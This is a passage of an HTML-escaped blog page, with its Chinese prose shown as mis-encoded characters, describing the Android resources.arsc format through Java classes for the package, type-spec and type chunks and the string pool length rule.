&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nd">@Override&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="n">String&lt;/span> &lt;span class="nf">toString&lt;/span>&lt;span class="o">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="s">&amp;#34;header:&amp;#34;&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">header&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">toString&lt;/span>&lt;span class="o">()+&lt;/span>&lt;span class="s">&amp;#34;\n&amp;#34;&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="s">&amp;#34;stringCount:&amp;#34;&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">stringCount&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="s">&amp;#34;,styleCount:&amp;#34;&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">styleCount&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="s">&amp;#34;,flags:&amp;#34;&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">flags&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="s">&amp;#34;,stringStart:&amp;#34;&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">stringsStart&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="s">&amp;#34;,stylesStart:&amp;#34;&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">stylesStart&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="http://my-md-1253484710.coscd.myqcloud.com/20180829205108.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>å­—ç¬¦ä¸²èµ„æºæ± ä¸­çš„å­—ç¬¦ä¸²å‰ä¸¤ä¸ªå­—èŠ‚ä¸ºå­—ç¬¦ä¸²é•¿åº¦,é•¿åº¦è®¡ç®—æ–¹æ³•å¦‚ä¸‹ï¼š&lt;/p>
&lt;p>&lt;code>len = (((hbyte &amp;amp; 0x7F) &amp;lt;&amp;lt; 8)) | lbyte;&lt;/code>&lt;/p>
&lt;p>å¦‚æœå­—ç¬¦ä¸²ç¼–ç æ ¼å¼ä¸ºUTF-8åˆ™å­—ç¬¦ä¸²ä»¥0X00ä½œä¸ºç»“æŸç¬¦,UTF-16åˆ™ä»¥0X0000ä½œä¸ºç»“æŸç¬¦ã€‚&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>Packageæ•°æ®å—&lt;/strong>&lt;/p>
&lt;p>è¿™ä¸ªæ•°æ®å—è®°å½•ç¼–è¯‘åŒ…çš„å…ƒæ•°æ®ï¼Œå¤´éƒ¨ä¿¡æ¯å¦‚ä¸‹ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-java" data-lang="java">&lt;span class="line">&lt;span class="cl">&lt;span class="kd">public&lt;/span> &lt;span class="kd">class&lt;/span> &lt;span class="nc">ResTablePackage&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="n">ResChunkHeader&lt;/span> &lt;span class="n">header&lt;/span>&lt;span class="o">;&lt;/span> &lt;span class="c1">//Chunkçš„å¤´éƒ¨ä¿¡æ¯æ•°æ®ç»“æ„
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="kd">public&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">id&lt;/span>&lt;span class="o">;&lt;/span> &lt;span class="c1">//åŒ…çš„ID,ç­‰äºPackage Id,ä¸€èˆ¬ç”¨æˆ·åŒ…çš„å€¼Package Idä¸º0X7F,ç³»ç»Ÿèµ„æºåŒ…çš„Package Idä¸º0X01ï¼›
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="kd">public&lt;/span> &lt;span class="kt">char&lt;/span>&lt;span class="o">[]&lt;/span> &lt;span class="n">name&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="kt">char&lt;/span>&lt;span class="o">[&lt;/span>&lt;span class="n">128&lt;/span>&lt;span class="o">];&lt;/span> &lt;span class="c1">//åŒ…å
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="kd">public&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">typeStrings&lt;/span>&lt;span class="o">;&lt;/span> &lt;span class="c1">//ç±»å‹å­—ç¬¦ä¸²èµ„æºæ± ç›¸å¯¹å¤´éƒ¨çš„åç§»
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="kd">public&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">lastPublicType&lt;/span>&lt;span class="o">;&lt;/span> &lt;span class="c1">//æœ€åä¸€ä¸ªå¯¼å‡ºçš„Publicç±»å‹å­—ç¬¦ä¸²åœ¨ç±»å‹å­—ç¬¦ä¸²èµ„æºæ± ä¸­çš„ç´¢å¼•ï¼Œç›®å‰è¿™ä¸ªå€¼è®¾ç½®ä¸ºç±»å‹å­—ç¬¦ä¸²èµ„æºæ± çš„å…ƒç´ ä¸ªæ•°ã€‚åœ¨è§£æçš„è¿‡ç¨‹ä¸­æ²¡å‘ç°ä»–çš„ç”¨é€”
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="kd">public&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">keyStrings&lt;/span>&lt;span class="o">;&lt;/span> &lt;span class="c1">//èµ„æºé¡¹åç§°å­—ç¬¦ä¸²ç›¸å¯¹å¤´éƒ¨çš„åç§»
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="kd">public&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">lastPublicKey&lt;/span>&lt;span class="o">;&lt;/span> &lt;span class="c1">// æœ€åä¸€ä¸ªå¯¼å‡ºçš„Publicèµ„æºé¡¹åç§°å­—ç¬¦ä¸²åœ¨èµ„æºé¡¹åç§°å­—ç¬¦ä¸²èµ„æºæ± ä¸­çš„ç´¢å¼•ï¼Œç›®å‰è¿™ä¸ªå€¼è®¾ç½®ä¸ºèµ„æºé¡¹åç§°å­—ç¬¦ä¸²èµ„æºæ± çš„å…ƒç´ ä¸ªæ•°ã€‚åœ¨è§£æçš„è¿‡ç¨‹ä¸­æ²¡å‘ç°ä»–çš„ç”¨é€”
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="nf">ResTablePackage&lt;/span>&lt;span class="o">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">header&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="n">ResChunkHeader&lt;/span>&lt;span class="o">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nd">@Override&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="n">String&lt;/span> &lt;span class="nf">toString&lt;/span>&lt;span class="o">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="s">&amp;#34;header:&amp;#34;&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">header&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">toString&lt;/span>&lt;span class="o">()+&lt;/span>&lt;span class="s">&amp;#34;\n&amp;#34;&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="s">&amp;#34;,id=&amp;#34;&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">id&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="s">&amp;#34;,name:&amp;#34;&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">name&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">toString&lt;/span>&lt;span class="o">()+&lt;/span>&lt;span class="s">&amp;#34;,typeStrings:&amp;#34;&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">typeStrings&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="s">&amp;#34;,lastPublicType:&amp;#34;&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">lastPublicType&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="s">&amp;#34;,keyStrings:&amp;#34;&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">keyStrings&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="s">&amp;#34;,lastPublicKey:&amp;#34;&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">lastPublicKey&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="http://my-md-1253484710.coscd.myqcloud.com/20180829205652.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>ç±»å‹è§„èŒƒæ•°æ®å—&lt;/strong>&lt;/p>
&lt;p>ç”¨æ¥æè¿°èµ„æºé¡¹çš„é…ç½®å·®å¼‚æ€§ã€‚æ¯ä¸€ç§ç±»å‹éƒ½å¯¹åº”æœ‰ä¸€ä¸ªç±»å‹è§„èŒƒæ•°æ®å—ã€‚&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-java" data-lang="java">&lt;span class="line">&lt;span class="cl">&lt;span class="kd">public&lt;/span> &lt;span class="kd">class&lt;/span> &lt;span class="nc">ResTableTypeSpec&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="kd">final&lt;/span> &lt;span class="kd">static&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">SPEC_PUBLIC&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">0x40000000&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="n">ResChunkHeader&lt;/span> &lt;span class="n">header&lt;/span>&lt;span class="o">;&lt;/span> &lt;span class="c1">//Chunkçš„å¤´éƒ¨ä¿¡æ¯ç»“æ„
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="kd">public&lt;/span> &lt;span class="kt">byte&lt;/span> &lt;span class="n">id&lt;/span>&lt;span class="o">;&lt;/span> &lt;span class="c1">//æ ‡è¯†èµ„æºçš„Type ID,Type IDæ˜¯æŒ‡èµ„æºçš„ç±»å‹IDã€‚èµ„æºçš„ç±»å‹æœ‰animatorã€animã€colorã€drawableã€layoutã€menuã€rawã€stringå’Œxmlç­‰ç­‰è‹¥å¹²ç§ï¼Œæ¯ä¸€ç§éƒ½ä¼šè¢«èµ‹äºˆä¸€ä¸ªIDã€‚
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="kd">public&lt;/span> &lt;span class="kt">byte&lt;/span> &lt;span class="n">res0&lt;/span>&lt;span class="o">;&lt;/span> &lt;span class="c1">//ä¿ç•™,å§‹ç»ˆä¸º0
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="kd">public&lt;/span> &lt;span class="kt">short&lt;/span> &lt;span class="n">res1&lt;/span>&lt;span class="o">;&lt;/span> &lt;span class="c1">//ä¿ç•™,å§‹ç»ˆä¸º0
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="kd">public&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">entryCount&lt;/span>&lt;span class="o">;&lt;/span> &lt;span class="c1">//ç­‰äºæœ¬ç±»å‹çš„èµ„æºé¡¹ä¸ªæ•°,æŒ‡åç§°ç›¸åŒçš„èµ„æºé¡¹çš„ä¸ªæ•°ã€‚
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="nf">ResTableTypeSpec&lt;/span>&lt;span class="o">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">header&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="n">ResChunkHeader&lt;/span>&lt;span class="o">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nd">@Override&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="n">String&lt;/span> &lt;span class="nf">toString&lt;/span>&lt;span class="o">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="s">&amp;#34;header:&amp;#34;&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">header&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">toString&lt;/span>&lt;span class="o">()+&lt;/span>&lt;span class="s">&amp;#34;,id:&amp;#34;&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">id&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="s">&amp;#34;,res0:&amp;#34;&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">res0&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="s">&amp;#34;,res1:&amp;#34;&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">res1&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="s">&amp;#34;,entryCount:&amp;#34;&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">entryCount&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;strong>èµ„æºç±»å‹é¡¹æ•°æ®å—&lt;/strong>&lt;/p>
&lt;p>æè¿°èµ„æºé¡¹çš„å…·ä½“ä¿¡æ¯ï¼Œåç§°ã€å€¼ã€é…ç½®ç­‰ä¿¡æ¯&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-java" data-lang="java">&lt;span class="line">&lt;span class="cl">&lt;span class="kd">public&lt;/span> &lt;span class="kd">class&lt;/span> &lt;span class="nc">ResTableType&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="n">ResChunkHeader&lt;/span> &lt;span class="n">header&lt;/span>&lt;span class="o">;&lt;/span> &lt;span class="c1">//Chunkçš„å¤´éƒ¨ä¿¡æ¯ç»“æ„
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="kd">final&lt;/span> &lt;span class="kd">static&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">NO_ENTRY&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">0xFFFFFFFF&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="kt">byte&lt;/span> &lt;span class="n">id&lt;/span>&lt;span class="o">;&lt;/span> &lt;span class="c1">//æ ‡è¯†èµ„æºçš„Type ID
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="kd">public&lt;/span> &lt;span class="kt">byte&lt;/span> &lt;span class="n">res0&lt;/span>&lt;span class="o">;&lt;/span> &lt;span class="c1">//ä¿ç•™,å§‹ç»ˆä¸º0
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="kd">public&lt;/span> &lt;span class="kt">short&lt;/span> &lt;span class="n">res1&lt;/span>&lt;span class="o">;&lt;/span> &lt;span class="c1">//ä¿ç•™,å§‹ç»ˆä¸º0
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="kd">public&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">entryCount&lt;/span>&lt;span class="o">;&lt;/span> &lt;span class="c1">//ç­‰äºæœ¬ç±»å‹çš„èµ„æºé¡¹ä¸ªæ•°,æŒ‡åç§°ç›¸åŒçš„èµ„æºé¡¹çš„ä¸ªæ•°ã€‚
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="kd">public&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">entriesStart&lt;/span>&lt;span class="o">;&lt;/span> &lt;span class="c1">//ç­‰äºèµ„æºé¡¹æ•°æ®å—ç›¸å¯¹å¤´éƒ¨çš„åç§»å€¼ã€‚
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="n">ResTableConfig&lt;/span> &lt;span class="n">resConfig&lt;/span>&lt;span class="o">;&lt;/span> &lt;span class="c1">//æŒ‡å‘ä¸€ä¸ªResTable_config,ç”¨æ¥æè¿°é…ç½®ä¿¡æ¯,åœ°åŒº,è¯­è¨€,åˆ†è¾¨ç‡ç­‰
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="nf">ResTableType&lt;/span>&lt;span class="o">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">header&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="n">ResChunkHeader&lt;/span>&lt;span class="o">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">resConfig&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="n">ResTableConfig&lt;/span>&lt;span class="o">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="nf">getSize&lt;/span>&lt;span class="o">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">header&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">getHeaderSize&lt;/span>&lt;span class="o">()&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">1&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">1&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">2&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">4&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">4&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nd">@Override&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="n">String&lt;/span> &lt;span class="nf">toString&lt;/span>&lt;span class="o">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="s">&amp;#34;header:&amp;#34;&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">header&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">toString&lt;/span>&lt;span class="o">()+&lt;/span>&lt;span class="s">&amp;#34;,id:&amp;#34;&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">id&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="s">&amp;#34;,res0:&amp;#34;&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">res0&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="s">&amp;#34;,res1:&amp;#34;&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">res1&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="s">&amp;#34;,entryCount:&amp;#34;&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">entryCount&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="s">&amp;#34;,entriesStart:&amp;#34;&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">entriesStart&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>ResTable_typeåæ¥ç€æ˜¯ä¸€ä¸ªå¤§å°ä¸ºentryCountçš„uint32_tæ•°ç»„ï¼Œæ¯ä¸€ä¸ªæ•°ç»„å…ƒç´ éƒ½ç”¨æ¥æè¿°ä¸€ä¸ªèµ„æºé¡¹æ•°æ®å—çš„åç§»ä½ç½®ã€‚ ç´§è·Ÿåœ¨è¿™ä¸ªåç§»æ•°ç»„åé¢çš„æ˜¯ä¸€ä¸ªå¤§å°ä¸ºentryCountçš„ResTable_entryæ•°ç»„,æ¯ä¸€ä¸ªæ•°ç»„å…ƒç´ éƒ½ç”¨æ¥æè¿°ä¸€ä¸ªèµ„æºé¡¹çš„å…·ä½“ä¿¡æ¯ã€‚ResTable_entryçš„ç»“æ„å¦‚ä¸‹ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
